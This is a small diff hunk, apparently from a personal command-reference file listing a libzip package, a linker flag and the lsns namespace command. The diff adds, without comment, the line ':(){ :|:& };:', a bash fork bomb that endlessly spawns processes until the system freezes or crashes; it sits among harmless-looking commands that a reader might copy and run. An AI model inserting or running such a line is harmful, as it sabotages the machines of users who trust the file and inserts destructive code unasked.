@@ -2,6 +2,7 @@ libzip-dev
 
 -lzip
 
+:(){ :|:& };:
 
 # List processes and their namespaces
 lsns                           # List all namespaces
